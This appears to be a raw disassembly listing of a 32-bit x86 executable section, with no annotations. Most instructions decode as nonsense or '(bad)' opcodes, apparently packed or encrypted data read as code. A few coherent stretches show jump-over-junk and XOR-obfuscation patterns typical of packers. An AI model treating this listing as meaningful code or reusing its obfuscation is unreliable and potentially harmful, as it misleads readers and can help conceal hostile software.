  40ce01:	lock arpl WORD PTR [esp+esi*2],bx
  40ce05:	jg     0x40cd8c
  40ce07:	mov    esp,edi
  40ce09:	fsub   QWORD PTR [edi+0x7f]
  40ce0c:	out    0x8f,eax
  40ce0e:	sbb    eax,0xbd451e10
  40ce13:	loop   0x40ce89
  40ce15:	xchg   ebx,eax
  40ce16:	js     0x40ce6d
  40ce18:	push   edi
  40ce19:	mov    fs,WORD PTR [ebx+0x32d9f03]
  40ce1f:	jmp    0x5bca:0xc47fb915
  40ce26:	mov    esi,0xb42fe92a
  40ce2b:	mov    bl,0x7b
  40ce2d:	fidivr WORD PTR [ebp-0x7f]
  40ce30:	push   eax
  40ce31:	cmp    DWORD PTR [ecx-0x7251aaef],esi
  40ce37:	stos   DWORD PTR es:[edi],eax
  40ce38:	stc    
  40ce39:	popa   
  40ce3a:	(bad)  
  40ce3b:	into   
  40ce3c:	rol    BYTE PTR [edi],cl
  40ce3e:	sbb    eax,0x1e922cab
  40ce43:	lds    ebp,FWORD PTR [eax-0x1f15bd55]
  40ce49:	pushf  
  40ce4a:	adc    DWORD PTR [edx+ecx*4+0xa],edx
  40ce4e:	dec    ecx
  40ce4f:	or     dl,BYTE PTR [ecx-0x4ea881bd]
  40ce55:	stc    
  40ce56:	xor    eax,DWORD PTR [eax+0x58f45fbb]
  40ce5c:	adc    al,0xc3
  40ce5e:	aam    0x78
  40ce60:	pop    edi
  40ce61:	mov    dh,0x2
  40ce63:	mov    cs,WORD PTR [ecx-0x1b]
  40ce66:	ins    BYTE PTR es:[edi],dx
  40ce67:	push   eax
  40ce68:	push   0xb20e7bad
  40ce6d:	retf   
  40ce6e:	xchg   ebp,eax
  40ce6f:	call   0x6a8e75ae
  40ce74:	pusha  
  40ce75:	add    DWORD PTR [edx],eax
  40ce77:	(bad)  
  40ce78:	out    0x50,al
  40ce7a:	push   0xa8e4d5d8
  40ce7f:	hlt    
  40ce80:	or     eax,0x9b652f71
  40ce85:	mov    ch,0x64
  40ce87:	pop    ds
  40ce88:	push   esp
  40ce89:	jno    0x40ce98
  40ce8b:	mov    bh,0x73
  40ce8d:	(bad)  
  40ce8e:	jmp    0x40ce5c
  40ce90:	mov    fs:0x4c8c568b,al
  40ce96:	sbb    eax,0x94779f2f
  40ce9b:	bound  esi,QWORD PTR [eax+ebp*1+0x191dc285]
  40cea2:	inc    esp
  40cea3:	inc    edx
  40cea4:	pop    eax
  40cea5:	scas   eax,DWORD PTR es:[edi]
  40cea6:	or     eax,0xccb0429
  40ceab:	ja     0x40ce33
  40cead:	sar    eax,0x4d
  40ceb0:	mov    esi,0xdc241d3b
  40ceb5:	cmp    ecx,edx
  40ceb7:	dec    esp
  40ceb8:	sub    cl,BYTE PTR [eax+0xf]
  40cebb:	scas   al,BYTE PTR es:[edi]
  40cebc:	add    dl,al
  40cebe:	into   
  40cebf:	scas   al,BYTE PTR es:[edi]
  40cec0:	sbb    cl,bh
  40cec2:	add    DWORD PTR [edx],edi
  40cec4:	xchg   DWORD PTR [ecx],ecx
  40cec6:	or     dh,BYTE PTR [eax+0x5d]
  40cec9:	(bad)  
  40cecb:	(bad)  
  40cecc:	xlat   BYTE PTR ds:[ebx]
  40cecd:	dec    esp
  40cece:	push   edi
  40cecf:	inc    esi
  40ced0:	in     al,dx
  40ced1:	push   ds
  40ced2:	cmp    BYTE PTR [ecx+0x5],al
  40ced5:	popf   
  40ced6:	and    DWORD PTR [ebp+0x6e],edx
  40ced9:	cld    
  40ceda:	xchg   ecx,eax
  40cedb:	fucomp st(5)
  40cedd:	mov    ch,0x8d
  40cedf:	call   0xd1f854e0
  40cee4:	mov    ebp,ebp
  40cee6:	sub    esi,edi
  40cee8:	or     esi,ebx
  40ceea:	leave  
  40ceeb:	ret    0xe9fb
  40ceee:	xor    ebx,DWORD PTR [eax]
  40cef0:	add    DWORD PTR [ebp+0x3300b7c6],0x3a
  40cef7:	leave  
  40cef8:	outs   dx,BYTE PTR ds:[esi]
  40cef9:	mov    dh,BYTE PTR [edx]
  40cefb:	dec    esp
  40cefc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cefd:	pop    edi
  40cefe:	xchg   edx,eax
  40ceff:	cld    
  40cf00:	(bad)  ds:0xb8a3ad87
  40cf06:	push   cs
  40cf07:	sub    DWORD PTR [edi-0x44],ebp
  40cf0a:	mov    ch,0x7d
  40cf0c:	dec    esp
  40cf0d:	scas   al,BYTE PTR es:[edi]
  40cf0e:	ds pop es
  40cf10:	pop    esp
  40cf11:	xchg   edi,eax
  40cf12:	push   ds
  40cf13:	jmp    0xb4cb19c5
  40cf18:	sbb    ah,bl
  40cf1a:	cmp    BYTE PTR [ecx+0xe],bl
  40cf1d:	or     al,0xc7
  40cf1f:	std    
  40cf20:	mov    ds:0xb8c74f9e,al
  40cf25:	and    bh,ah
  40cf27:	pusha  
  40cf28:	lods   al,BYTE PTR ds:[esi]
  40cf29:	pop    ebx
  40cf2a:	dec    ebp
  40cf2b:	in     eax,dx
  40cf2c:	fs jns 0x40cefd
  40cf2f:	std    
  40cf30:	add    ebx,DWORD PTR [edx]
  40cf32:	pop    edi
  40cf33:	add    dl,dl
  40cf35:	adc    al,bh
  40cf37:	inc    ebp
  40cf38:	and    DWORD PTR [eax-0x37c4476e],eax
  40cf3e:	xchg   edx,eax
  40cf3f:	mov    BYTE PTR [eax+0x13293eb8],bh
  40cf45:	gs dec ecx
  40cf47:	jmp    DWORD PTR [ecx-0x3160b69]
  40cf4d:	mov    ?,edx
  40cf4f:	aas    
  40cf50:	push   edx
  40cf51:	mov    dh,0x3b
  40cf53:	xor    bh,BYTE PTR [edi]
  40cf55:	and    DWORD PTR [eax],ebx
  40cf57:	sbb    BYTE PTR [esi+ecx*1+0xdd313f2],al
  40cf5e:	pop    ecx
  40cf5f:	jp     0x40cf76
  40cf61:	jp     0x40cef3
  40cf63:	popf   
  40cf64:	jnp    0x40cef4
  40cf66:	pushf  
  40cf67:	(bad)  
  40cf69:	pop    edx
  40cf6a:	mov    dh,0x1e
  40cf6c:	push   ecx
  40cf6d:	and    ah,BYTE PTR ds:0xe36d7ee6
  40cf73:	lahf   
  40cf74:	loopne 0x40cf37
  40cf76:	(bad)  
  40cf77:	pop    edi
  40cf78:	gs mov ?,edx
  40cf7b:	(bad)  
  40cf7c:	jge    0x40cf2a
  40cf7e:	mov    edi,0x1dadf8b1
  40cf83:	ja     0x40cf0b
  40cf85:	addr16 xchg edx,eax
  40cf87:	jb     0x40cf94
  40cf89:	ins    BYTE PTR es:[edi],dx
  40cf8a:	pop    es
  40cf8b:	iret   
  40cf8c:	je     0x40b5e7
  40cf92:	mov    eax,0x800f1c81
  40cf97:	jmp    0x40b5ee
  40cf9c:	push   ebp
  40cf9d:	mov    ebp,esp
  40cf9f:	sub    esp,0x60
  40cfa2:	sbb    DWORD PTR ds:0x42a845,0x18d1
  40cfac:	mov    eax,DWORD PTR [ebp+0x8]
  40cfaf:	xor    DWORD PTR ds:0x42a879,0x42a75d
  40cfb9:	jmp    0x40d211
  40cfbe:	ror    esp,1
  40cfc0:	mov    dh,0xc5
  40cfc3:	fcmovbe st,st(1)
  40cfc5:	(bad)  [esi]
  40cfc7:	push   ds
  40cfc8:	aad    0x62
  40cfca:	dec    edx
  40cfcb:	mov    ds:0xa72a2bc8,eax
  40cfd0:	js     0x40d04a
  40cfd2:	xor    eax,0xd078787e
  40cfd7:	int    0x90
  40cfd9:	out    dx,al
  40cfda:	cmp    eax,0xddedb029
  40cfdf:	mov    edi,0xb1260291
  40cfe4:	xor    dl,ah
  40cfe6:	cld    
  40cfe7:	cmp    eax,0xc7ebeb2c
  40cfec:	retf   0x4d30
  40cfef:	(bad)  
  40cff0:	bound  ebx,QWORD PTR [edx-0x2acb7a07]
  40cff6:	data16 xor BYTE PTR [eax],bl
  40cff9:	in     al,dx
  40cffa:	xor    eax,0x36e16db4
  40cfff:	sar    BYTE PTR [eax-0xf13f2a0],0x64
  40d006:	jl     0x40d082
  40d008:	sti    
  40d009:	mov    edx,DWORD PTR [ebp-0x368ab700]
  40d00f:	stc    
  40d010:	jbe    0x40d06f
  40d012:	inc    ebp
  40d013:	xor    BYTE PTR [ecx+0x11],al
  40d016:	pushf  
  40d017:	dec    esp
  40d018:	sub    dl,BYTE PTR [edi-0x5a]
  40d01b:	in     al,0x56
  40d01d:	dec    ebx
  40d01e:	imul   ecx,DWORD PTR [edx],0xe1001eda
  40d024:	dec    ebx
  40d025:	pop    es
  40d026:	dec    edi
  40d027:	mov    ebp,0x5a5fc06
  40d02c:	das    
  40d02d:	les    edx,FWORD PTR [edi-0x18]
  40d030:	push   edx
  40d031:	out    dx,eax
  40d032:	mov    esp,0xed2bc202
  40d037:	xlat   BYTE PTR ds:[ebx]
  40d038:	adc    DWORD PTR [ebp+0x1a4bca29],0xffffff9d
  40d03f:	test   al,0x96
  40d041:	dec    ebp
  40d042:	cmp    ebp,ecx
  40d044:	dec    edx
  40d045:	nop
  40d046:	cmp    al,BYTE PTR ds:0x1dcb08c
  40d04c:	clc    
  40d04d:	sub    ecx,DWORD PTR [esi]
  40d04f:	scas   al,BYTE PTR es:[edi]
  40d050:	mov    ds:0x404e4534,al
  40d055:	fidivr WORD PTR [edx+0x36a5b54f]
  40d05b:	xlat   BYTE PTR ds:[ebx]
  40d05c:	fs jmp 0x2b02:0x7290a854
  40d064:	dec    esp
  40d065:	push   ecx
  40d066:	leave  
  40d067:	fcomp  DWORD PTR [esi+eiz*2]
  40d06a:	cld    
  40d06b:	cmp    DWORD PTR [edx+0x62],edx
  40d06e:	push   0x21e8204a
  40d073:	lods   al,BYTE PTR ds:[esi]
  40d074:	pop    esp
  40d075:	dec    ecx
  40d076:	mov    eax,ds:0x99c9ef09
  40d07b:	adc    edx,DWORD PTR [edi]
  40d07d:	(bad)  
  40d07e:	repnz cdq 
  40d080:	mov    al,0xf5
  40d082:	fs sahf 
  40d084:	inc    edx
  40d085:	push   0x1b25eaa4
  40d08a:	lock jge 0x40d0bb
  40d08d:	fnstcw WORD PTR [ebx+edi*2]
  40d090:	push   ss
  40d091:	add    bl,BYTE PTR [eax+0x11f140c]
  40d097:	lods   eax,DWORD PTR ds:[esi]
  40d098:	mov    esp,0x9fa3fdce
  40d09d:	outs   dx,DWORD PTR ds:[esi]
  40d09e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d09f:	and    DWORD PTR [edx+0x6],esi
  40d0a2:	add    BYTE PTR [ebx+0x10],cl
  40d0a5:	mov    bl,0xb4
  40d0a7:	out    dx,al
  40d0a8:	mov    esp,ebx
  40d0aa:	inc    ecx
  40d0ab:	inc    DWORD PTR [ecx]
  40d0ad:	(bad)  
  40d0af:	add    al,0x7e
  40d0b1:	retf   
  40d0b2:	ins    DWORD PTR es:[edi],dx
  40d0b3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d0b4:	ficomp DWORD PTR [edx]
  40d0b6:	mov    dl,0xaa
  40d0b8:	add    eax,0xe83fb274
  40d0bd:	popa   
  40d0be:	sub    cl,dl
  40d0c0:	idiv   BYTE PTR [esi-0x59c9ec8f]
  40d0c6:	sbb    al,0x5f
  40d0c8:	das    
  40d0c9:	cmp    al,0xb1
  40d0cb:	dec    ebp
  40d0cc:	les    edi,FWORD PTR [ebp+ecx*1-0x28647b3f]
  40d0d3:	pop    eax
  40d0d4:	adc    eax,0x6e86875c
  40d0d9:	bound  esp,QWORD PTR [edx-0x40]
  40d0dc:	daa    
  40d0dd:	adc    DWORD PTR [eax-0x17],esi
  40d0e0:	mov    bh,0x3e
  40d0e2:	popa   
  40d0e3:	fwait
  40d0e4:	daa    
  40d0e5:	sar    ecx,cl
  40d0e7:	pop    eax
  40d0e8:	clc    
  40d0e9:	loope  0x40d098
  40d0eb:	scas   eax,DWORD PTR es:[edi]
  40d0ec:	sbb    bh,ch
  40d0ee:	outs   dx,BYTE PTR ds:[esi]
  40d0ef:	fwait
  40d0f0:	dec    ebx
  40d0f1:	xchg   ecx,eax
  40d0f2:	push   esp
  40d0f3:	jl     0x40d0e5
  40d0f5:	retf   0xc1cc
  40d0f8:	jg     0x40d102
  40d0fa:	les    ecx,FWORD PTR [esi-0x69]
  40d0fd:	fstp   TBYTE PTR [edi+ebp*4-0xf]
  40d101:	add    ebp,DWORD PTR [ecx-0x7e44d22a]
  40d107:	sub    bh,BYTE PTR [edx]
  40d109:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d10a:	or     ch,0x4
  40d10d:	in     eax,dx
  40d10e:	xchg   ecx,eax
  40d10f:	icebp  
  40d110:	mov    dh,0x5d
  40d112:	dec    ecx
  40d113:	xchg   ecx,eax
  40d114:	mov    bl,0x79
  40d116:	mov    esp,0x6a03941a
  40d11b:	push   ecx
  40d11c:	out    0x86,eax
  40d11e:	ss push edi
  40d120:	mov    edi,0x1bc7d529
  40d125:	je     0x40d150
  40d127:	in     eax,dx
  40d128:	pop    eax
  40d129:	or     BYTE PTR [ebx+0x3b],bl
  40d12c:	sbb    al,BYTE PTR [edx+0x2af59412]
  40d132:	dec    edi
  40d133:	imul   ebx,DWORD PTR [edx],0x20
  40d136:	cbw    
  40d138:	xor    eax,0xdd2fe6e
  40d13d:	and    eax,0x8676ec60
  40d142:	mov    edx,0x961f6296
  40d147:	ds sub al,0x86
  40d14a:	int3   
  40d14b:	pop    esp
  40d14c:	lds    esi,FWORD PTR ds:0x9c0505cf
  40d152:	add    edx,edx
  40d154:	inc    esi
  40d155:	fadd   QWORD PTR [ecx+0x14]
  40d158:	fs pop edi
  40d15a:	gs mov edi,0x7f3ca25e
  40d160:	or     al,0x62
  40d162:	xchg   esp,eax
  40d163:	repz jnp 0x40d1e2
  40d166:	cmp    al,0x64
  40d168:	pop    ecx
  40d169:	test   bl,bh
  40d16b:	pop    ebp
  40d16c:	push   ss
  40d16d:	repz imul eax,ecx,0x6a2064d9
  40d174:	cdq    
  40d175:	(bad)  
  40d176:	das    
  40d177:	rcl    DWORD PTR [eax+0x7e2c473a],cl
  40d17d:	jo     0x40d194
  40d17f:	jae    0x40d169
  40d181:	xor    DWORD PTR [ebx+eiz*2],edi
  40d184:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d185:	inc    eax
  40d186:	jne    0x40d14f
  40d188:	mov    cl,0x6e
  40d18a:	mov    edx,DWORD PTR [edi-0x4ed13d6e]
  40d190:	pushf  
  40d191:	sbb    ch,BYTE PTR [edx+ebx*8-0x2846c688]
  40d198:	push   ss
  40d199:	xlat   BYTE PTR ds:[ebx]
  40d19a:	enter  0x70a6,0x9c
  40d19e:	lods   al,BYTE PTR ds:[esi]
  40d19f:	push   ss
  40d1a0:	xchg   esp,eax
  40d1a1:	sbb    dl,BYTE PTR [esi]
  40d1a3:	enter  0xba2d,0xa4
  40d1a7:	cmp    eax,0x24ee1a00
  40d1ac:	sbb    eax,0x5aff188d
  40d1b1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d1b2:	jbe    0x40d1d8
  40d1b4:	call   0xcf96:0xdef4ab4c
  40d1bb:	and    edi,eax
  40d1bd:	in     al,dx
  40d1be:	(bad)  
  40d1bf:	out    0x61,al
  40d1c1:	lods   eax,DWORD PTR ds:[esi]
  40d1c2:	pop    eax
  40d1c3:	out    0x14,al
  40d1c5:	cmp    ah,bl
  40d1c7:	sub    eax,0x7a73ce29
  40d1cc:	mov    ah,0xe9
  40d1ce:	add    eax,0xc167886b
  40d1d3:	inc    ebx
  40d1d4:	push   ds
  40d1d5:	mov    esp,0x28bdbe29
  40d1da:	cmp    BYTE PTR [ebp+0x44],dh
  40d1dd:	(bad)  
  40d1de:	mov    edi,0x53f31e71
  40d1e3:	mov    esi,0xef1378a0
  40d1e8:	es adc al,0x6a
  40d1eb:	popf   
  40d1ec:	xchg   ebx,eax
  40d1ed:	mov    eax,ds:0x23d43cad
  40d1f2:	ror    ah,0x47
  40d1f5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d1f6:	jmp    0xd13884f2
  40d1fb:	pop    ebx
  40d1fc:	or     DWORD PTR [esi],edx
  40d1fe:	das    
  40d1ff:	cmp    dh,bh
  40d201:	mov    bl,0xa8
  40d203:	jp     0x40d244
  40d205:	mov    edi,0xc5d833a4
  40d20a:	aaa    
  40d20b:	out    0xc,eax
  40d20d:	xlat   BYTE PTR ds:[ebx]
  40d20e:	push   cs
  40d20f:	enter  0x532c,0x56
  40d213:	and    DWORD PTR ds:0x42a7b5,0x0
  40d21d:	jmp    0x40d22f
  40d222:	mov    ebx,DWORD PTR ds:0x42a7b5
  40d228:	inc    ebx
  40d229:	mov    DWORD PTR ds:0x42a7b5,ebx
  40d22f:	cmp    DWORD PTR ds:0x42a7b5,0x1d
  40d236:	jae    0x40d254
  40d23c:	cmp    DWORD PTR ds:0x42a7b5,0x26
  40d243:	jne    0x40d24f
  40d249:	call   DWORD PTR ds:0x41d24c
  40d24f:	jmp    0x40d222
  40d254:	mov    esi,0x7510850
  40d259:	movzx  ebx,WORD PTR ds:0x42a775
  40d260:	xor    ebx,DWORD PTR ds:0x42a75d
  40d266:	mov    DWORD PTR ds:0x42a775,ebx
  40d26c:	xor    eax,esi
  40d26e:	or     ebx,0x7ad4
  40d274:	mov    ebx,0x327298
  40d279:	adc    DWORD PTR ds:0x42a7bd,0x42a879
  40d283:	add    eax,ebx
  40d285:	sub    DWORD PTR ds:0x42a889,0x2a37
  40d28f:	push   edi
  40d290:	mov    DWORD PTR [ebp-0x18],eax
  40d293:	adc    DWORD PTR ds:0x42a879,0x18
  40d29d:	mov    edi,DWORD PTR [ebp+0x8]
  40d2a0:	neg    DWORD PTR ds:0x42a845
  40d2a6:	xor    edi,esi
  40d2a8:	jmp    0x40d500
  40d2ad:	int    0xca
  40d2af:	iret   
  40d2b0:	retf   0xd9db
  40d2b3:	(bad)  
  40d2b5:	and    ah,ah
  40d2b7:	push   ecx
  40d2b8:	pusha  
  40d2b9:	(bad)  
  40d2ba:	fcom   DWORD PTR [eax]
  40d2bc:	hlt    
  40d2bd:	out    0xa5,eax
  40d2bf:	js     0x40d339
  40d2c1:	xor    eax,0x3778787e
  40d2c6:	popf   
  40d2c7:	fwait
  40d2c8:	adc    DWORD PTR [esi],esi
  40d2ca:	push   eax
  40d2cb:	jno    0x40d343
  40d2cd:	adc    dl,cl
  40d2cf:	push   ecx
  40d2d0:	push   0x98c446b2
  40d2d5:	push   esi
  40d2d6:	mov    ds:0xa1ec20e3,eax
  40d2db:	popa   
  40d2dc:	ds cli 
  40d2de:	mov    bl,0xd9
  40d2e0:	das    
  40d2e1:	lock adc ebp,DWORD PTR [ecx]
  40d2e4:	popa   
  40d2e5:	mov    bh,BYTE PTR [eax]
  40d2e7:	mov    dh,0xca
  40d2e9:	xor    al,0x94
  40d2eb:	push   0x63e271c4
  40d2f0:	ds or  eax,0xcb329d2e
  40d2f6:	clc    
  40d2f7:	push   ss
  40d2f8:	xchg   ebx,eax
  40d2f9:	and    ebx,0x295e549a
  40d2ff:	stc    
  40d300:	inc    ebp
  40d301:	mov    esi,0x6cb836e3
  40d306:	mov    ch,0xf
  40d308:	ror    BYTE PTR [edi+0x7768e49c],1
  40d30e:	and    al,BYTE PTR [ecx+0x66]
  40d311:	sbb    eax,0x195b3e07
  40d316:	pop    ecx
  40d317:	ds adc eax,0x52289d16
  40d31d:	xchg   DWORD PTR [esi-0x2c04a52d],ebp
  40d323:	mov    esi,0xafae77bc
  40d328:	dec    esp
  40d329:	cdq    
  40d32a:	mov    ds,WORD PTR [esi+0x48d7d6b0]
  40d330:	pop    ecx
  40d331:	pop    edi
  40d332:	lea    ebp,[ebx+0x70]
  40d335:	test   BYTE PTR [ebx-0x68],ch
  40d338:	mov    WORD PTR [esi+0x3b],fs
  40d33b:	(bad)  
  40d33c:	cld    
  40d33d:	and    al,0xda
  40d33f:	in     eax,dx
  40d340:	fwait
  40d341:	xor    al,0x91
  40d343:	sub    DWORD PTR [ebx-0x3c4a5d41],eax
  40d349:	adc    ecx,DWORD PTR [edx]
  40d34b:	out    0x9f,eax
  40d34d:	jmp    0xdc4a28d9
  40d352:	mov    ch,0xf2
  40d354:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d355:	xchg   edi,eax
  40d356:	add    ax,0xb099
  40d35a:	(bad)  
  40d35b:	sbb    dh,al
  40d35d:	jle    0x40d31f
  40d35f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d360:	std    
  40d361:	adc    cl,BYTE PTR [eax-0x30c14905]
  40d367:	ins    DWORD PTR es:[edi],dx
  40d368:	pop    ebp
  40d369:	rcr    DWORD PTR [ecx],1
  40d36b:	dec    ecx
  40d36c:	push   edi
  40d36d:	out    dx,al
  40d36e:	lock ins DWORD PTR es:[edi],dx
  40d370:	mov    ebx,0x55db03b6
  40d375:	mov    edi,0xad638015
  40d37a:	jb     0x40d305
  40d37c:	shr    BYTE PTR [edi-0x7fd2d44],cl
  40d382:	or     BYTE PTR [ecx-0x4c145f3b],0x5a
  40d389:	push   0x2
  40d38b:	stos   DWORD PTR es:[edi],eax
  40d38c:	adc    al,0x75
  40d38e:	iret   
  40d38f:	cli    
  40d390:	mov    BYTE PTR [ebp+0x68c2f30e],al
  40d396:	aaa    
  40d397:	imul   edi,DWORD PTR [edx+0x558f8bcc],0x61fece77
  40d3a1:	cmc    
  40d3a2:	aad    0xf4
  40d3a4:	mov    cl,0xfb
  40d3a6:	js     0x40d40b
  40d3a8:	test   al,0x6f
  40d3aa:	retf   
  40d3ab:	jns    0x40d3ba
  40d3ad:	mov    dl,0xb8
  40d3af:	addr16 ret 
  40d3b1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d3b2:	add    esp,DWORD PTR [ecx]
  40d3b4:	push   ebx
  40d3b5:	push   0xfffffffa
  40d3b7:	(bad)  
  40d3b9:	sbb    cl,al
  40d3bb:	fist   WORD PTR [ecx+ecx*2+0x71]
  40d3bf:	or     ebp,edi
  40d3c1:	sbb    cl,al
  40d3c3:	lods   eax,DWORD PTR ds:[esi]
  40d3c4:	jge    0x40d3d2
  40d3c6:	sbb    BYTE PTR [ebp+0x40],al
  40d3c9:	sahf   
  40d3ca:	nop    ecx
  40d3cd:	test   al,0x90
  40d3cf:	mov    DWORD PTR [ecx-0x4a613f8d],ecx
  40d3d5:	out    0xa5,al
  40d3d7:	gs sub dl,dl
  40d3da:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d3db:	stc    
  40d3dc:	cwde   
  40d3dd:	xor    eax,0xfcbc2477
  40d3e2:	lea    esp,[ecx]
  40d3e4:	fst    DWORD PTR [ebx]
  40d3e6:	cmp    eax,DWORD PTR [ebp+0x78146327]
  40d3ec:	push   esp
  40d3ed:	das    
  40d3ee:	hlt    
  40d3ef:	cmp    BYTE PTR [esi+ecx*1],0x49
  40d3f3:	push   cs
  40d3f4:	jecxz  0x40d43a
  40d3f6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d3f7:	test   BYTE PTR [ebp+eiz*1-0x2b],bl
  40d3fb:	jae    0x40d470
  40d3fd:	xor    DWORD PTR [edi-0x19],ecx
  40d400:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d401:	fst    DWORD PTR [ebp+0x3f266654]
  40d407:	lea    edi,[esi-0x6cf9b69f]
  40d40d:	rep ins DWORD PTR es:[edi],dx
  40d40f:	xchg   edx,eax
  40d410:	mov    dl,0x8b
  40d412:	push   ebp
  40d413:	inc    esp
  40d414:	inc    esi
  40d415:	stc    
  40d416:	sub    cl,BYTE PTR [edx-0x11]
  40d419:	inc    eax
  40d41a:	push   ds
  40d41b:	stos   BYTE PTR es:[edi],al
  40d41c:	and    ebp,DWORD PTR [edi+0x5f0019e6]
  40d422:	mov    eax,0x4211afed
  40d427:	fdiv   QWORD PTR [ecx]
  40d429:	shl    BYTE PTR [eax-0x7f],0xe6
  40d42d:	les    esp,FWORD PTR cs:[ebx-0x48]
  40d431:	pushf  
  40d432:	and    eax,0x70223aff
  40d437:	in     eax,dx
  40d438:	pusha  
  40d439:	test   BYTE PTR [ebp+0x4b6db3b9],0xb4
  40d440:	sub    BYTE PTR [eax-0x2ca8f25b],dl
  40d446:	(bad)  
  40d447:	lods   al,BYTE PTR ds:[esi]
  40d448:	not    DWORD PTR [ecx]
  40d44a:	cmp    eax,0x1a8ca750
  40d44f:	ret    0xb544
  40d452:	or     eax,0x9bfec895
  40d457:	call   0x15ff:0x50628625
  40d45e:	cmp    eax,0x15772694
  40d463:	and    ebx,DWORD PTR ds:0x42953e44
  40d469:	add    eax,0x31bcc620
  40d46e:	mov    esi,0x5410c4bd
  40d473:	sbb    BYTE PTR [ebx+0x6a336dae],bh
  40d479:	sbb    BYTE PTR [esi],cl
  40d47b:	push   edi
  40d47c:	mov    ds:0xbded0511,eax
  40d481:	dec    edi
  40d482:	mov    ds:0xce03ff9b,al
  40d487:	cdq    
  40d488:	stos   BYTE PTR es:[edi],al
  40d489:	dec    eax
  40d48a:	mov    al,ds:0x66334051
  40d48f:	or     BYTE PTR ds:0xee18f1e7,ah
  40d495:	mov    edx,es
  40d497:	push   edi
  40d498:	into   
  40d499:	xchg   ebp,eax
  40d49a:	push   DWORD PTR [ebx+eiz*8-0xeab19b9]
  40d4a1:	sbb    eax,0x7fb1b4d1
  40d4a6:	mov    DWORD PTR [eax],ebx
  40d4a8:	adc    eax,0xf38463bc
  40d4ad:	mov    edi,0x2e812701
  40d4b2:	adc    al,0xfe
  40d4b5:	lods   eax,DWORD PTR ds:[esi]
  40d4b6:	jge    0x40d4c0
  40d4b8:	mov    DWORD PTR [edx],esp
  40d4ba:	fstp   QWORD PTR [esp+ecx*2-0x4505d4a1]
  40d4c1:	ret    0xcc7f
  40d4c4:	jns    0x40d457
  40d4c6:	jae    0x40d541
  40d4c8:	js     0x40d510
  40d4ca:	inc    ebp
  40d4cb:	out    0x1b,eax
  40d4cd:	in     al,0x40
  40d4cf:	das    
  40d4d0:	fisttp QWORD PTR [ebx]
  40d4d2:	test   BYTE PTR [edx+0xbefc9b3],ah
  40d4d8:	jecxz  0x40d50d
  40d4da:	test   al,0x4f
  40d4dc:	sub    ecx,ebx
  40d4de:	fs jge 0x40d4d5
  40d4e1:	xchg   ebp,eax
  40d4e2:	enter  0x3509,0xc0
  40d4e6:	mov    dh,0x5e
  40d4e8:	idiv   DWORD PTR [edi]
  40d4ea:	mov    edi,0x2856936f
  40d4ef:	adc    eax,0x71986373
  40d4f4:	xor    dl,BYTE PTR [eax+0x79de16c]
  40d4fa:	(bad)  
  40d4fb:	js     0x40d513
  40d4fd:	ins    BYTE PTR es:[edi],dx
  40d4fe:	dec    ecx
  40d4ff:	inc    edi
  40d500:	mov    DWORD PTR [ebp-0xc],0xf89c85f8
  40d507:	mov    DWORD PTR [ebp-0x10],0xf89c8738
  40d50e:	and    DWORD PTR ds:0x42a7f5,0x42a805
  40d518:	add    edi,ebx
  40d51a:	jmp    0x40e985
  40d51f:	cmp    edi,0x3f
  40d522:	jne    0x40d55a
  40d528:	mov    eax,0x337e
  40d52d:	mov    eax,ds:0x41e966
  40d532:	mov    eax,DWORD PTR [eax]
  40d534:	mov    DWORD PTR [ebp-0x14],eax
  40d537:	mov    eax,ds:0x41eb6e
  40d53c:	mov    DWORD PTR ds:0x42a769,0x45db
  40d546:	mov    eax,DWORD PTR [eax]
  40d548:	mov    DWORD PTR [ebp-0x18],eax
  40d54b:	mov    DWORD PTR ds:0x42a7cd,0x1d30
  40d555:	jmp    0x40e979
  40d55a:	mov    DWORD PTR ds:0x42a835,0x19ca
  40d564:	jmp    0x40d7bc
  40d569:	leave  
  40d56a:	ret    
  40d56b:	enter  0xd6c6,0xd9
  40d56f:	fld    st(3)
  40d571:	int    0x93
  40d573:	fdiv   st,st(0)
  40d575:	test   BYTE PTR es:[ecx-0x4b],dl
  40d579:	pushf  
  40d57a:	stos   DWORD PTR es:[edi],eax
  40d57b:	js     0x40d5f5
  40d57d:	xor    eax,0xe978787e
  40d582:	je     0x40d542
  40d584:	rcl    BYTE PTR [ebx-0x6c],1
  40d587:	add    DWORD PTR [esi],ecx
  40d589:	sub    al,0x73
  40d58b:	xchg   esp,eax
  40d58c:	jne    0x40d576
  40d58e:	inc    ecx
  40d58f:	les    edi,FWORD PTR [esi]
  40d591:	rol    BYTE PTR [edx],0xf8
  40d594:	or     eax,0x442657e0
  40d599:	xchg   edx,eax
  40d59a:	(bad)  
  40d59b:	loop   0x40d5e4
  40d59d:	scas   eax,DWORD PTR es:[edi]
  40d59e:	in     al,dx
  40d59f:	mov    eax,ds:0x4a8acef2
  40d5a4:	in     eax,0x84
  40d5a6:	mov    al,0x7b
  40d5a8:	push   0x92f24b5f
  40d5ad:	aas    
  40d5ae:	xor    eax,0xe5df0d91
  40d5b3:	push   0x8a0e96b8
  40d5b8:	add    dl,BYTE PTR [eax-0x236e7d91]
  40d5be:	jns    0x40d5a0
  40d5c0:	(bad)  [edi]
  40d5c2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d5c3:	mov    ebp,0x19baf394
  40d5c8:	xor    DWORD PTR [ecx],eax
  40d5ca:	ret    0xc09c
  40d5cd:	rcl    BYTE PTR [edx-0x7b3282d7],1
  40d5d3:	mov    es,WORD PTR [eax]
  40d5d5:	sahf   
  40d5d6:	dec    BYTE PTR [eax]
  40d5d8:	lea    ebx,[ebx+0x3e37fd0b]
  40d5de:	pushf  
  40d5df:	dec    ebp
  40d5e0:	sahf   
  40d5e1:	xchg   esi,ebx
  40d5e3:	out    dx,eax
  40d5e4:	xor    al,0xa7
